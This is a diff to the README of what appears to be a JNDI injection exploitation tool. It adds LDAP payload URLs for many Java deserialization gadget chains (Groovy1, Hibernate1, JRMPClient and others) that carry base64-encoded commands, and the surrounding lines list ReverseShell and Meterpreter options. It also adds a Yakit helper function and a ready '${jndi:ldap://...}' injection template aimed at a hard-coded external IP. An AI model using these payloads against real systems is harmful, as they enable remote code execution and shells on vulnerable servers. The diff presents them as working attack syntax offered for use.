@@ -62,6 +62,8 @@ Supported LADP Queries：
 [+] Deserialize Queries: ldap://0.0.0.0:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
     ldap://0.0.0.0:1389/Deserialization/URLDNS/[domain]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
+    
+    ldap://0.0.0.0:1389/Deserialization/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK3/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK4/Command/Base64/[base64_encoded_cmd]
@@ -73,6 +75,7 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/Deserialization/CommonsCollections5/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollections6/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollections7/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsCollections7Lite_4/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/C3P092/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/Click1/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/Clojure/Command/Base64/[base64_encoded_cmd]
@@ -82,6 +85,19 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2NOCC/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils3/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1183NOCC/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/Jython1/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/JSON1/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/Groovy1/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/Hibernate1/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/Hibernate2/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/JavassistWeld1/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/JBossInterceptors1/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/Jdk7u21variant/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/JRMPClient/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/JRMPClient_Activator/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/JRMPClient_Obj/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/JRMPListener/Command/Base64/[base64_encoded_cmd]
+    
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2/TomcatEcho
     ldap://0.0.0.0:1389/Deserialization/C3P0/SpringEcho
@@ -162,6 +178,10 @@ Supported LADP Queries：
   * ```URLDNS```
   * ```CommonsBeanutils1```  
   * ```CommonsBeanutils2```
+  * ```CommonsBeanutils2NOCC```
+  * ```CommonsBeanutils3```
+  * ```CommonsBeanutils3183```
+  * ```CommonsBeanutils1183NOCC```
   * ```CommonsCollections1```
   * ```CommonsCollections1_1```
   * ```CommonsCollections2```
@@ -184,10 +204,19 @@ Supported LADP Queries：
   * ```C3P092```
   * ```Click1```
   * ```Clojure```
-  * ```CommonsBeanutils2NOCC```
-  * ```CommonsBeanutils3```
-  * ```CommonsBeanutils3183```
-  * ```CommonsBeanutils1183NOCC```
+  * ```Jython1```
+  * ```Json1```
+  * ```Groovy1```
+  * ```Hibernate1```
+  * ```Hibernate2```
+  * ```JavassistWeld1```
+  * ```JBossInterceptors1```
+  * ```Jdk7u21variant```
+  * ```JRMPClient```
+  * ```JRMPClient_Activator```
+  * ```JRMPClient_Obj```
+  * ```JRMPListener```
+  
 * ```WebsphereBypass``` 中的 3 个动作：
   * ```list```：基于```XXE```查看目标服务器上的目录或文件内容
   * ```upload```：基于```XXE```的```jar协议```将恶意```jar包```上传至目标服务器的临时目录
@@ -208,7 +237,26 @@ Supported LADP Queries：
   使用msf的java/meterpreter/reverse_tcp开启监听
   ldap://127.0.0.1:1389/TomcatBypass/Meterpreter/[msfip]/[msfport]
 ```
+# 🐍Yakit一劳永逸的方便法子
 
+先于热加载标签中插入代码
+
+```go
+jndiNu = func(Payload) {
+    Command := str.Split(Payload,"#")
+    cmd := codec.EncodeBase64(Command[1])
+    Payload := str.Replace(Command[0],"CommandNew",cmd,1)
+    return codec.EncodeUrl(Payload)
+}
+```
+
+之后只需要改 GadgetType ，与Command即可
+
+```{{yak(jndiNu|${jndi:ldap://42.192.234.204:1389/Deserialization/Groovy1/Command/Base64/CommandNew}#ping 123)}}```
+
+![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown微信截图_20220803130851.png)
+
+![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown微信截图_20220803131020.png)
 
 ---
 
